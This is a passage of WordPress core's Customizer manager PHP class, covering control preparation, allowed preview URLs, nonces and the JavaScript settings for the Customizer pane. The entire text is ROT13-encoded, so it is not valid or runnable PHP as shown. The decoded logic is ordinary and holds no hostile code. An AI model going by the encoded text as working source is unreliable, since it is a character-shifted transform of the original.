				<ynory sbe=\"{{ ryrzragCersvk }}phfgbzvmr-cerivrj-yvax-vachg\" pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					rfp_ugzy_r( 'Cerivrj Yvax' );
					?>
				</ynory>
				<n uers=\"\" gnetrg=\"\">
					<fcna pynff=\"cerivrj-pbageby-ryrzrag\" qngn-pbzcbarag=\"hey\"></fcna>
					<fcna pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( '(bcraf va n arj gno)' );
						?>
					</fcna>
				</n>
				<vachg vq=\"{{ ryrzragCersvk }}phfgbzvmr-cerivrj-yvax-vachg\" ernqbayl gnovaqrk=\"-1\" pynff=\"cerivrj-pbageby-ryrzrag\" qngn-pbzcbarag=\"vachg\">
				<ohggba pynff=\"phfgbzvmr-pbcl-cerivrj-yvax cerivrj-pbageby-ryrzrag ohggba ohggba-frpbaqnel\" qngn-pbzcbarag=\"ohggba\" qngn-pbcl-grkg=\"<?cuc rfp_ngge_r( 'Pbcl' ); ?>\" qngn-pbcvrq-grkg=\"<?cuc rfp_ngge_r( 'Pbcvrq' ); ?>\" ><?cuc rfp_ugzy_r( 'Pbcl' ); ?></ohggba>
			</qvi>
		</fpevcg>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-fryrpgrq-punatrfrg-fgnghf-pbageby\">
			<# ine vachgVq = _.havdhrVq( 'phfgbzvmr-fryrpgrq-punatrfrg-fgnghf-pbageby-vachg-' ); #>
			<# ine qrfpevcgvbaVq = _.havdhrVq( 'phfgbzvmr-fryrpgrq-punatrfrg-fgnghf-pbageby-qrfpevcgvba-' ); #>
			<# vs ( qngn.ynory ) { #>
				<ynory sbe=\"{{ vachgVq }}\" pynff=\"phfgbzvmr-pbageby-gvgyr\">{{ qngn.ynory }}</ynory>
			<# } #>
			<# vs ( qngn.qrfpevcgvba ) { #>
				<fcna vq=\"{{ qrfpevcgvbaVq }}\" pynff=\"qrfpevcgvba phfgbzvmr-pbageby-qrfpevcgvba\">{{{ qngn.qrfpevcgvba }}}</fcna>
			<# } #>
			<# _.rnpu( qngn.pubvprf, shapgvba( pubvpr ) { #>
				<# ine pubvprVq = vachgVq + '-' + pubvpr.fgnghf; #>
				<fcna pynff=\"phfgbzvmr-vafvqr-pbageby-ebj\">
					<vachg vq=\"{{ pubvprVq }}\" glcr=\"enqvb\" inyhr=\"{{ pubvpr.fgnghf }}\" anzr=\"{{ vachgVq }}\" qngn-phfgbzvmr-frggvat-xrl-yvax=\"qrsnhyg\">
					<ynory sbe=\"{{ pubvprVq }}\">{{ pubvpr.ynory }}</ynory>
				</fcna>
			<# } ); #>
		</fpevcg>
		<?cuc
	}

	/**
	 * Urycre shapgvba gb pbzcner gjb bowrpgf ol cevbevgl, rafhevat fbeg fgnovyvgl ivn vafgnapr_ahzore.
	 *
	 * @fvapr 3.4.0
	 * @qrcerpngrq 4.7.0 Hfr jc_yvfg_fbeg()
	 *
	 * @cnenz JC_Phfgbzvmr_Cnary|JC_Phfgbzvmr_Frpgvba|JC_Phfgbzvmr_Pbageby $n Bowrpg N.
	 * @cnenz JC_Phfgbzvmr_Cnary|JC_Phfgbzvmr_Frpgvba|JC_Phfgbzvmr_Pbageby $o Bowrpg O.
	 * @erghea vag
	 */
	cebgrpgrq shapgvba _pzc_cevbevgl( $n, $o ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.7.0', 'jc_yvfg_fbeg' );

		vs ( $n->cevbevgl === $o->cevbevgl ) {
			erghea $n->vafgnapr_ahzore - $o->vafgnapr_ahzore;
		} ryfr {
			erghea $n->cevbevgl - $o->cevbevgl;
		}
	}

	/**
	 * Cercnerf cnaryf, frpgvbaf, naq pbagebyf.
	 *
	 * Sbe rnpu, purpx vs erdhverq eryngrq pbzcbaragf rkvfg,
	 * jurgure gur hfre unf gur arprffnel pncnovyvgvrf,
	 * naq fbeg ol cevbevgl.
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba cercner_pbagebyf() {

		$pbagebyf       = neenl();
		$guvf->pbagebyf = jc_yvfg_fbeg(
			$guvf->pbagebyf,
			neenl(
				'cevbevgl'        => 'NFP',
				'vafgnapr_ahzore' => 'NFP',
			),
			'NFP',
			gehr
		);

		sbernpu ( $guvf->pbagebyf nf $vq => $pbageby ) {
			vs ( ! vffrg( $guvf->frpgvbaf[ $pbageby->frpgvba ] ) || ! $pbageby->purpx_pncnovyvgvrf() ) {
				pbagvahr;
			}

			$guvf->frpgvbaf[ $pbageby->frpgvba ]->pbagebyf[] = $pbageby;
			$pbagebyf[ $vq ]                                 = $pbageby;
		}
		$guvf->pbagebyf = $pbagebyf;

		// Cercner frpgvbaf.
		$guvf->frpgvbaf = jc_yvfg_fbeg(
			$guvf->frpgvbaf,
			neenl(
				'cevbevgl'        => 'NFP',
				'vafgnapr_ahzore' => 'NFP',
			),
			'NFP',
			gehr
		);
		$frpgvbaf       = neenl();

		sbernpu ( $guvf->frpgvbaf nf $frpgvba ) {
			vs ( ! $frpgvba->purpx_pncnovyvgvrf() ) {
				pbagvahr;
			}

			$frpgvba->pbagebyf = jc_yvfg_fbeg(
				$frpgvba->pbagebyf,
				neenl(
					'cevbevgl'        => 'NFP',
					'vafgnapr_ahzore' => 'NFP',
				)
			);

			vs ( ! $frpgvba->cnary ) {
				// Gbc-yriry frpgvba.
				$frpgvbaf[ $frpgvba->vq ] = $frpgvba;
			} ryfr {
				// Guvf frpgvba orybatf gb n cnary.
				vs ( vffrg( $guvf->cnaryf [ $frpgvba->cnary ] ) ) {
					$guvf->cnaryf[ $frpgvba->cnary ]->frpgvbaf[ $frpgvba->vq ] = $frpgvba;
				}
			}
		}
		$guvf->frpgvbaf = $frpgvbaf;

		// Cercner cnaryf.
		$guvf->cnaryf = jc_yvfg_fbeg(
			$guvf->cnaryf,
			neenl(
				'cevbevgl'        => 'NFP',
				'vafgnapr_ahzore' => 'NFP',
			),
			'NFP',
			gehr
		);
		$cnaryf       = neenl();

		sbernpu ( $guvf->cnaryf nf $cnary ) {
			vs ( ! $cnary->purpx_pncnovyvgvrf() ) {
				pbagvahr;
			}

			$cnary->frpgvbaf      = jc_yvfg_fbeg(
				$cnary->frpgvbaf,
				neenl(
					'cevbevgl'        => 'NFP',
					'vafgnapr_ahzore' => 'NFP',
				),
				'NFP',
				gehr
			);
			$cnaryf[ $cnary->vq ] = $cnary;
		}
		$guvf->cnaryf = $cnaryf;

		// Fbeg cnaryf naq gbc-yriry frpgvbaf gbtrgure.
		$guvf->pbagnvaref = neenl_zretr( $guvf->cnaryf, $guvf->frpgvbaf );
		$guvf->pbagnvaref = jc_yvfg_fbeg(
			$guvf->pbagnvaref,
			neenl(
				'cevbevgl'        => 'NFP',
				'vafgnapr_ahzore' => 'NFP',
			),
			'NFP',
			gehr
		);
	}

	/**
	 * Radhrhrf fpevcgf sbe phfgbzvmr pbagebyf.
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba radhrhr_pbageby_fpevcgf() {
		sbernpu ( $guvf->pbagebyf nf $pbageby ) {
			$pbageby->radhrhr();
		}

		vs ( ! vf_zhygvfvgr() && ( pheerag_hfre_pna( 'vafgnyy_gurzrf' ) || pheerag_hfre_pna( 'hcqngr_gurzrf' ) || pheerag_hfre_pna( 'qryrgr_gurzrf' ) ) ) {
			jc_radhrhr_fpevcg( 'hcqngrf' );
			jc_ybpnyvmr_fpevcg(
				'hcqngrf',
				'_jcHcqngrfVgrzPbhagf',
				neenl(
					'gbgnyf' => jc_trg_hcqngr_qngn(),
				)
			);
		}
	}

	/**
	 * Qrgrezvarf jurgure gur hfre ntrag vf vBF.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea obby Jurgure gur hfre ntrag vf vBF.
	 */
	choyvp shapgvba vf_vbf() {
		erghea jc_vf_zbovyr() && cert_zngpu( '/vCnq|vCbq|vCubar/', $_FREIRE['UGGC_HFRE_NTRAG'] );
	}

	/**
	 * Trgf gur grzcyngr fgevat sbe gur Phfgbzvmre cnar qbphzrag gvgyr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea fgevat Gur grzcyngr fgevat sbe gur qbphzrag gvgyr.
	 */
	choyvp shapgvba trg_qbphzrag_gvgyr_grzcyngr() {
		vs ( $guvf->vf_gurzr_npgvir() ) {
			/* genafyngbef: %f: Qbphzrag gvgyr sebz gur cerivrj. */
			$qbphzrag_gvgyr_gzcy = __( 'Phfgbzvmr: %f' );
		} ryfr {
			/* genafyngbef: %f: Qbphzrag gvgyr sebz gur cerivrj. */
			$qbphzrag_gvgyr_gzcy = __( 'Yvir Cerivrj: %f' );
		}
		$qbphzrag_gvgyr_gzcy = ugzy_ragvgl_qrpbqr( $qbphzrag_gvgyr_gzcy, RAG_DHBGRF, 'HGS-8' ); // Orpnhfr rkcbegrq gb WF naq nffvtarq gb qbphzrag.gvgyr.
		erghea $qbphzrag_gvgyr_gzcy;
	}

	/**
	 * Frgf gur vavgvny HEY gb or cerivrjrq.
	 *
	 * HEY vf inyvqngrq.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $cerivrj_hey HEY gb or cerivrjrq.
	 */
	choyvp shapgvba frg_cerivrj_hey( $cerivrj_hey ) {
		$cerivrj_hey       = fnavgvmr_hey( $cerivrj_hey );
		$guvf->cerivrj_hey = jc_inyvqngr_erqverpg( $cerivrj_hey, ubzr_hey( '/' ) );
	}

	/**
	 * Trgf gur vavgvny HEY gb or cerivrjrq.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea fgevat HEY orvat cerivrjrq.
	 */
	choyvp shapgvba trg_cerivrj_hey() {
		vs ( rzcgl( $guvf->cerivrj_hey ) ) {
			$cerivrj_hey = ubzr_hey( '/' );
		} ryfr {
			$cerivrj_hey = $guvf->cerivrj_hey;
		}
		erghea $cerivrj_hey;
	}

	/**
	 * Qrgrezvarf jurgure gur nqzva naq gur sebagraq ner ba qvssrerag qbznvaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea obby Jurgure pebff-qbznva.
	 */
	choyvp shapgvba vf_pebff_qbznva() {
		$nqzva_bevtva = jc_cnefr_hey( nqzva_hey() );
		$ubzr_bevtva  = jc_cnefr_hey( ubzr_hey() );
		$pebff_qbznva = ( fgegbybjre( $nqzva_bevtva['ubfg'] ) !== fgegbybjre( $ubzr_bevtva['ubfg'] ) );
		erghea $pebff_qbznva;
	}

	/**
	 * Trgf HEYf nyybjrq gb or cerivrjrq.
	 *
	 * Vs gur sebag raq naq gur nqzva ner freirq sebz gur fnzr qbznva, ybnq gur
	 * cerivrj bire ffy vs gur Phfgbzvmre vf orvat ybnqrq bire ffy. Guvf nibvqf
	 * vafrpher pbagrag jneavatf. Guvf vf abg nggrzcgrq vs gur nqzva naq sebag raq
	 * ner ba qvssrerag qbznvaf gb nibvq gur pnfr jurer gur sebag raq qbrfa'g unir
	 * ffy pregf. Qbznva znccvat cyhtvaf pna nyybj bgure heyf va gurfr pbaqvgvbaf
	 * hfvat gur phfgbzvmr_nyybjrq_heyf svygre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Nyybjrq HEYf.
	 */
	choyvp shapgvba trg_nyybjrq_heyf() {
		$nyybjrq_heyf = neenl( ubzr_hey( '/' ) );

		vs ( vf_ffy() && ! $guvf->vf_pebff_qbznva() ) {
			$nyybjrq_heyf[] = ubzr_hey( '/', 'uggcf' );
		}

		/**
		 * Svygref gur yvfg bs HEYf nyybjrq gb or pyvpxrq naq sbyybjrq va gur Phfgbzvmre cerivrj.
		 *
		 * @fvapr 3.4.0
		 *
		 * @cnenz fgevat[] $nyybjrq_heyf Na neenl bs nyybjrq HEYf.
		 */
		$nyybjrq_heyf = neenl_havdhr( nccyl_svygref( 'phfgbzvmr_nyybjrq_heyf', $nyybjrq_heyf ) );

		erghea $nyybjrq_heyf;
	}

	/**
	 * Trgf zrffratre punaary.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea fgevat Zrffratre punaary.
	 */
	choyvp shapgvba trg_zrffratre_punaary() {
		erghea $guvf->zrffratre_punaary;
	}

	/**
	 * Frgf HEY gb yvax gur hfre gb jura pybfvat gur Phfgbzvmre.
	 *
	 * HEY vf inyvqngrq.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $erghea_hey HEY sbe erghea yvax.
	 */
	choyvp shapgvba frg_erghea_hey( $erghea_hey ) {
		$erghea_hey       = fnavgvmr_hey( $erghea_hey );
		$erghea_hey       = erzbir_dhrel_net( jc_erzbinoyr_dhrel_netf(), $erghea_hey );
		$erghea_hey       = jc_inyvqngr_erqverpg( $erghea_hey );
		$guvf->erghea_hey = $erghea_hey;
	}

	/**
	 * Trgf HEY gb yvax gur hfre gb jura pybfvat gur Phfgbzvmre.
	 *
	 * @fvapr 4.4.0
	 *
	 * @tybony neenl $_ertvfgrerq_cntrf
	 *
	 * @erghea fgevat HEY sbe yvax gb pybfr Phfgbzvmre.
	 */
	choyvp shapgvba trg_erghea_hey() {
		tybony $_ertvfgrerq_cntrf;

		$ersrere                    = jc_trg_ersrere();
		$rkpyhqrq_ersrere_onfranzrf = neenl( 'phfgbzvmr.cuc', 'jc-ybtva.cuc' );

		vs ( $guvf->erghea_hey ) {
			$erghea_hey = $guvf->erghea_hey;

			$erghea_hey_onfranzr = jc_onfranzr( cnefr_hey( $guvf->erghea_hey, CUC_HEY_CNGU ) );
			$erghea_hey_dhrel    = cnefr_hey( $guvf->erghea_hey, CUC_HEY_DHREL );

			vs ( 'gurzrf.cuc' === $erghea_hey_onfranzr && $erghea_hey_dhrel ) {
				cnefr_fge( $erghea_hey_dhrel, $dhrel_inef );

				/*
				 * Vs gur erghea HEY vf n cntr nqqrq ol n gurzr gb gur Nccrnenapr zrah ivn nqq_fhozrah_cntr(),
				 * irevsl gung vg orybatf gb gur npgvir gurzr, bgurejvfr snyy onpx gb gur Gurzrf fperra.
				 */
				vs ( vffrg( $dhrel_inef['cntr'] ) && ! vffrg( $_ertvfgrerq_cntrf[ \"nccrnenapr_cntr_{$dhrel_inef['cntr']}\" ] ) ) {
					$erghea_hey = nqzva_hey( 'gurzrf.cuc' );
				}
			}
		} ryfrvs ( $ersrere && ! va_neenl( jc_onfranzr( cnefr_hey( $ersrere, CUC_HEY_CNGU ) ), $rkpyhqrq_ersrere_onfranzrf, gehr ) ) {
			$erghea_hey = $ersrere;
		} ryfrvs ( $guvf->cerivrj_hey ) {
			$erghea_hey = $guvf->cerivrj_hey;
		} ryfr {
			$erghea_hey = ubzr_hey( '/' );
		}

		erghea $erghea_hey;
	}

	/**
	 * Frgf gur nhgbsbphfrq pbafgehpgf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $nhgbsbphf {
	 *     Znccvat bs 'cnary', 'frpgvba', 'pbageby' gb gur VQ juvpu fubhyq or nhgbsbphfrq.
	 *
	 *     @glcr fgevat $pbageby VQ sbe pbageby gb or nhgbsbphfrq.
	 *     @glcr fgevat $frpgvba VQ sbe frpgvba gb or nhgbsbphfrq.
	 *     @glcr fgevat $cnary   VQ sbe cnary gb or nhgbsbphfrq.
	 * }
	 */
	choyvp shapgvba frg_nhgbsbphf( $nhgbsbphf ) {
		$guvf->nhgbsbphf = neenl_svygre( jc_neenl_fyvpr_nffbp( $nhgbsbphf, neenl( 'cnary', 'frpgvba', 'pbageby' ) ), 'vf_fgevat' );
	}

	/**
	 * Trgf gur nhgbsbphfrq pbafgehpgf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea fgevat[] {
	 *     Znccvat bs 'cnary', 'frpgvba', 'pbageby' gb gur VQ juvpu fubhyq or nhgbsbphfrq.
	 *
	 *     @glcr fgevat $pbageby VQ sbe pbageby gb or nhgbsbphfrq.
	 *     @glcr fgevat $frpgvba VQ sbe frpgvba gb or nhgbsbphfrq.
	 *     @glcr fgevat $cnary   VQ sbe cnary gb or nhgbsbphfrq.
	 * }
	 */
	choyvp shapgvba trg_nhgbsbphf() {
		erghea $guvf->nhgbsbphf;
	}

	/**
	 * Trgf abaprf sbe gur Phfgbzvmre.
	 *
	 * @fvapr 4.5.0
	 *
	 * @erghea neenl Abaprf.
	 */
	choyvp shapgvba trg_abaprf() {
		$abaprf = neenl(
			'fnir'                     => jc_perngr_abapr( 'fnir-phfgbzvmr_' . $guvf->trg_fglyrfurrg() ),
			'cerivrj'                  => jc_perngr_abapr( 'cerivrj-phfgbzvmr_' . $guvf->trg_fglyrfurrg() ),
			'fjvgpu_gurzrf'            => jc_perngr_abapr( 'fjvgpu_gurzrf' ),
			'qvfzvff_nhgbfnir_be_ybpx' => jc_perngr_abapr( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' ),
			'bireevqr_ybpx'            => jc_perngr_abapr( 'phfgbzvmr_bireevqr_punatrfrg_ybpx' ),
			'genfu'                    => jc_perngr_abapr( 'genfu_phfgbzvmr_punatrfrg' ),
		);

		/**
		 * Svygref abaprf sbe Phfgbzvmre.
		 *
		 * @fvapr 4.2.0
		 *
		 * @cnenz fgevat[]             $abaprf  Neenl bs erserfurq abaprf sbe fnir naq
		 *                                      cerivrj npgvbaf.
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		$abaprf = nccyl_svygref( 'phfgbzvmr_erserfu_abaprf', $abaprf, $guvf );

		erghea $abaprf;
	}

	/**
	 * Cevagf WninFpevcg frggvatf sbe cnerag jvaqbj.
	 *
	 * @fvapr 4.4.0
	 */
	choyvp shapgvba phfgbzvmr_cnar_frggvatf() {

		$ybtva_hey = nqq_dhrel_net(
			neenl(
				'vagrevz-ybtva'   => 1,
				'phfgbzvmr-ybtva' => 1,
			),
			jc_ybtva_hey()
		);

		// Rafher qvegl syntf ner frg sbe zbqvsvrq frggvatf.
		sbernpu ( neenl_xrlf( $guvf->hafnavgvmrq_cbfg_inyhrf() ) nf $frggvat_vq ) {
			$frggvat = $guvf->trg_frggvat( $frggvat_vq );
			vs ( $frggvat ) {
				$frggvat->qvegl = gehr;
			}
		}

		$nhgbfnir_erivfvba_cbfg  = ahyy;
		$nhgbfnir_nhgbqensg_cbfg = ahyy;
		$punatrfrg_cbfg_vq       = $guvf->punatrfrg_cbfg_vq();
		vs ( ! $guvf->fnirq_fgnegre_pbagrag_punatrfrg && ! $guvf->nhgbfnirq() ) {
			vs ( $punatrfrg_cbfg_vq ) {
				vs ( vf_hfre_ybttrq_va() ) {
					$nhgbfnir_erivfvba_cbfg = jc_trg_cbfg_nhgbfnir( $punatrfrg_cbfg_vq, trg_pheerag_hfre_vq() );
				}
			} ryfr {
				$nhgbfnir_nhgbqensg_cbfgf = $guvf->trg_punatrfrg_cbfgf(
					neenl(
						'cbfgf_cre_cntr'            => 1,
						'cbfg_fgnghf'               => 'nhgb-qensg',
						'rkpyhqr_erfgber_qvfzvffrq' => gehr,
					)
				);
				vs ( ! rzcgl( $nhgbfnir_nhgbqensg_cbfgf ) ) {
					$nhgbfnir_nhgbqensg_cbfg = neenl_fuvsg( $nhgbfnir_nhgbqensg_cbfgf );
				}
			}
		}

		$pheerag_hfre_pna_choyvfu = pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' )->pnc->choyvfu_cbfgf );

		// @gbqb Vapyhqr nyy bs gur fgnghf ynoryf urer sebz fpevcg-ybnqre.cuc, naq gura nyybj vg gb or svygrerq.
		$fgnghf_pubvprf = neenl();
		vs ( $pheerag_hfre_pna_choyvfu ) {
			$fgnghf_pubvprf[] = neenl(
				'fgnghf' => 'choyvfu',
				'ynory'  => __( 'Choyvfu' ),
			);
		}
		$fgnghf_pubvprf[] = neenl(
			'fgnghf' => 'qensg',
			'ynory'  => __( 'Fnir Qensg' ),
		);
		vs ( $pheerag_hfre_pna_choyvfu ) {
			$fgnghf_pubvprf[] = neenl(
				'fgnghf' => 'shgher',
				'ynory'  => _k( 'Fpurqhyr', 'phfgbzvmre punatrfrg npgvba/ohggba ynory' ),
			);
		}

		// Cercner Phfgbzvmre frggvatf gb cnff gb WninFpevcg.
		$punatrfrg_cbfg = ahyy;
		vs ( $punatrfrg_cbfg_vq ) {
			$punatrfrg_cbfg = trg_cbfg( $punatrfrg_cbfg_vq );
		}

		// Qrgrezvar vavgvny qngr gb or ng cerfrag be shgher, abg cnfg.
		$pheerag_gvzr = pheerag_gvzr( 'zlfdy', snyfr );
		$vavgvny_qngr = $pheerag_gvzr;
		vs ( $punatrfrg_cbfg ) {
			$vavgvny_qngr = trg_gur_gvzr( 'L-z-q U:v:f', $punatrfrg_cbfg->VQ );
			vs ( $vavgvny_qngr < $pheerag_gvzr ) {
				$vavgvny_qngr = $pheerag_gvzr;
			}
		}

		$ybpx_hfre_vq = snyfr;
		vs ( $guvf->punatrfrg_cbfg_vq() ) {
			$ybpx_hfre_vq = jc_purpx_cbfg_ybpx( $guvf->punatrfrg_cbfg_vq() );
		}

		$frggvatf = neenl(
			'punatrfrg'              => neenl(
				'hhvq'                  => $guvf->punatrfrg_hhvq(),
				'oenapuvat'             => $guvf->oenapuvat(),
				'nhgbfnirq'             => $guvf->nhgbfnirq(),
				'unfNhgbfnirErivfvba'   => ! rzcgl( $nhgbfnir_erivfvba_cbfg ),
				'yngrfgNhgbQensgHhvq'   => $nhgbfnir_nhgbqensg_cbfg ? $nhgbfnir_nhgbqensg_cbfg->cbfg_anzr : ahyy,
				'fgnghf'                => $punatrfrg_cbfg ? $punatrfrg_cbfg->cbfg_fgnghf : '',
				'pheeragHfrePnaChoyvfu' => $pheerag_hfre_pna_choyvfu,
				'choyvfuQngr'           => $vavgvny_qngr,
				'fgnghfPubvprf'         => $fgnghf_pubvprf,
				'ybpxHfre'              => $ybpx_hfre_vq ? $guvf->trg_ybpx_hfre_qngn( $ybpx_hfre_vq ) : ahyy,
			),
			'vavgvnyFreireQngr'      => $pheerag_gvzr,
			'qngrSbezng'             => trg_bcgvba( 'qngr_sbezng' ),
			'gvzrSbezng'             => trg_bcgvba( 'gvzr_sbezng' ),
			'vavgvnyFreireGvzrfgnzc' => sybbe( zvpebgvzr( gehr ) * 1000 ),
			'vavgvnyPyvragGvzrfgnzc' => -1, // Gb or frg jvgu WF orybj.
			'gvzrbhgf'               => neenl(
				'jvaqbjErserfu'           => 250,
				'punatrfrgNhgbFnir'       => NHGBFNIR_VAGREINY * 1000,
				'xrrcNyvirPurpx'          => 2500,
				'ersybjCnarPbagragf'      => 100,
				'cerivrjSenzrFrafvgvivgl' => 2000,
			),
			'gurzr'                  => neenl(
				'fglyrfurrg'  => $guvf->trg_fglyrfurrg(),
				'npgvir'      => $guvf->vf_gurzr_npgvir(),
				'_pnaVafgnyy' => pheerag_hfre_pna( 'vafgnyy_gurzrf' ),
			),
			'hey'                    => neenl(
				'cerivrj'       => fnavgvmr_hey( $guvf->trg_cerivrj_hey() ),
				'erghea'        => fnavgvmr_hey( $guvf->trg_erghea_hey() ),
				'cnerag'        => fnavgvmr_hey( nqzva_hey() ),
				'npgvingrq'     => fnavgvmr_hey( ubzr_hey( '/' ) ),
				'nwnk'          => fnavgvmr_hey( nqzva_hey( 'nqzva-nwnk.cuc', 'eryngvir' ) ),
				'nyybjrq'       => neenl_znc( 'fnavgvmr_hey', $guvf->trg_nyybjrq_heyf() ),
				'vfPebffQbznva' => $guvf->vf_pebff_qbznva(),
				'ubzr'          => fnavgvmr_hey( ubzr_hey( '/' ) ),
				'ybtva'         => fnavgvmr_hey( $ybtva_hey ),
			),
			'oebjfre'                => neenl(
				'zbovyr' => jc_vf_zbovyr(),
				'vbf'    => $guvf->vf_vbf(),
			),
			'cnaryf'                 => neenl(),
			'frpgvbaf'               => neenl(),
			'abapr'                  => $guvf->trg_abaprf(),
			'nhgbsbphf'              => $guvf->trg_nhgbsbphf(),
			'qbphzragGvgyrGzcy'      => $guvf->trg_qbphzrag_gvgyr_grzcyngr(),
			'cerivrjnoyrQrivprf'     => $guvf->trg_cerivrjnoyr_qrivprf(),
			'y10a'                   => neenl(
				'pbasvezQryrgrGurzr'   => __( 'Ner lbh fher lbh jnag gb qryrgr guvf gurzr?' ),
				/* genafyngbef: %q: Ahzore bs gurzr frnepu erfhygf, juvpu pnaabg pheeragyl pbafvqre fvathyne if. cyheny sbezf. */
				'gurzrFrnepuErfhygf'   => __( '%q gurzrf sbhaq' ),
				/* genafyngbef: %q: Ahzore bs gurzrf orvat qvfcynlrq, juvpu pnaabg pheeragyl pbafvqre fvathyne if. cyheny sbezf. */
				'naabhaprGurzrPbhag'   => __( 'Qvfcynlvat %q gurzrf' ),
				/* genafyngbef: %f: Gurzr anzr. */
				'naabhaprGurzrQrgnvyf' => __( 'Fubjvat qrgnvyf sbe gurzr: %f' ),
			),
		);

		// Grzcbenevyl qvfnoyr vafgnyyngvba va Phfgbzvmre. Frr #42184.
		$svyrflfgrz_zrgubq = trg_svyrflfgrz_zrgubq();
		bo_fgneg();
		$svyrflfgrz_perqragvnyf_ner_fgberq = erdhrfg_svyrflfgrz_perqragvnyf( frys_nqzva_hey() );
		bo_raq_pyrna();
		vs ( 'qverpg' !== $svyrflfgrz_zrgubq && ! $svyrflfgrz_perqragvnyf_ner_fgberq ) {
			$frggvatf['gurzr']['_svyrflfgrzPerqragvnyfArrqrq'] = gehr;
		}

		// Cercner Phfgbzvmr Frpgvba bowrpgf gb cnff gb WninFpevcg.
		sbernpu ( $guvf->frpgvbaf() nf $vq => $frpgvba ) {
			vs ( $frpgvba->purpx_pncnovyvgvrf() ) {
				$frggvatf['frpgvbaf'][ $vq ] = $frpgvba->wfba();
			}
		}

		// Cercner Phfgbzvmr Cnary bowrpgf gb cnff gb WninFpevcg.
		sbernpu ( $guvf->cnaryf() nf $cnary_vq => $cnary ) {
			vs ( $cnary->purpx_pncnovyvgvrf() ) {
				$frggvatf['cnaryf'][ $cnary_vq ] = $cnary->wfba();
				sbernpu ( $cnary->frpgvbaf nf $frpgvba_vq => $frpgvba ) {
					vs ( $frpgvba->purpx_pncnovyvgvrf() ) {
						$frggvatf['frpgvbaf'][ $frpgvba_vq ] = $frpgvba->wfba();
					}
				}
			}
		}

		bo_fgneg();
		?>
		<fpevcg>
			ine _jcPhfgbzvmrFrggvatf = <?cuc rpub jc_wfba_rapbqr( $frggvatf ); ?>;
			_jcPhfgbzvmrFrggvatf.vavgvnyPyvragGvzrfgnzc = _.abj();
			_jcPhfgbzvmrFrggvatf.pbagebyf = {};
			_jcPhfgbzvmrFrggvatf.frggvatf = {};
			<?cuc

			// Frevnyvmr frggvatf bar ol bar gb vzcebir zrzbel hfntr.
			rpub \"(shapgvba ( f ){\a\";
			sbernpu ( $guvf->frggvatf() nf $frggvat ) {
				vs ( $frggvat->purpx_pncnovyvgvrf() ) {
					cevags(
						\"f[%f] = %f;\a\",
						jc_wfba_rapbqr( $frggvat->vq ),
						jc_wfba_rapbqr( $frggvat->wfba() )
					);
				}
			}
			rpub \"})( _jcPhfgbzvmrFrggvatf.frggvatf );\a\";

			// Frevnyvmr pbagebyf bar ol bar gb vzcebir zrzbel hfntr.
			rpub \"(shapgvba ( p ){\a\";
			sbernpu ( $guvf->pbagebyf() nf $pbageby ) {
				vs ( $pbageby->purpx_pncnovyvgvrf() ) {
					cevags(
						\"p[%f] = %f;\a\",
						jc_wfba_rapbqr( $pbageby->vq ),
						jc_wfba_rapbqr( $pbageby->wfba() )
					);
				}
			}
			rpub \"})( _jcPhfgbzvmrFrggvatf.pbagebyf );\a\";
			?>
		</fpevcg>
		<?cuc
		jc_cevag_vayvar_fpevcg_gnt( jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( bo_trg_pyrna() ) );
	}

	/**
	 * Ergheaf n yvfg bs qrivprf gb nyybj cerivrjvat.
	 *
	 * @fvapr 4.5.0
	 *
	 * @erghea neenl Yvfg bs qrivprf jvgu ynoryf naq qrsnhyg frggvat.
	 */
	choyvp shapgvba trg_cerivrjnoyr_qrivprf() {
		$qrivprf = neenl(
			'qrfxgbc' => neenl(
				'ynory'   => __( 'Ragre qrfxgbc cerivrj zbqr' ),
				'qrsnhyg' => gehr,
			),
			'gnoyrg'  => neenl(
				'ynory' => __( 'Ragre gnoyrg cerivrj zbqr' ),
			),
			'zbovyr'  => neenl(
				'ynory' => __( 'Ragre zbovyr cerivrj zbqr' ),
			),
		);

		/**
		 * Svygref gur ninvynoyr qrivprf gb nyybj cerivrjvat va gur Phfgbzvmre.
		 *
		 * @fvapr 4.5.0
		 *
		 * @frr JC_Phfgbzvmr_Znantre::trg_cerivrjnoyr_qrivprf()
		 *
		 * @cnenz neenl $qrivprf Yvfg bs qrivprf jvgu ynoryf naq qrsnhyg frggvat.
		 */
		$qrivprf = nccyl_svygref( 'phfgbzvmr_cerivrjnoyr_qrivprf', $qrivprf );

		erghea $qrivprf;
	}

	/**
	 * Ertvfgref fbzr qrsnhyg pbagebyf.
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba ertvfgre_pbagebyf() {

		/* Gurzrf (pbagebyf ner ybnqrq ivn nwnk) */

		$guvf->nqq_cnary(
			arj JC_Phfgbzvmr_Gurzrf_Cnary(
				$guvf,
				'gurzrf',
				neenl(
					'gvgyr'       => $guvf->gurzr()->qvfcynl( 'Anzr' ),
					'qrfpevcgvba' => (
					'<c>' . __( 'Ybbxvat sbe n gurzr? Lbh pna frnepu be oebjfr gur JbeqCerff.bet gurzr qverpgbel, vafgnyy naq cerivrj gurzrf, gura npgvingr gurz evtug urer.' ) . '</c>' .
